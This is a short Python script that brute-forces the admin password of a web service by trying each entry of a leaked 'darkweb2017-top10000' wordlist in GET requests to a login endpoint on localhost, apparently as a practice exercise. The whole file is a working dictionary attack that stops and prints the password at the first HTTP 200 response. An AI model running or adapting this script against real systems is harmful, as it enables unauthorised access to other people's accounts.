import requests as request
with open("darkweb2017-top10000.txt", "r") as file:
    for line in file:
        attempt = request.get(f"http://localhost:4000/users?login=admin&pass={line.strip()}")
        if attempt.status_code == 200:
            print("Password found: " + line.strip())
            break
        else:
            print("Password failed: " + line.strip(), attempt.status_code)
            continue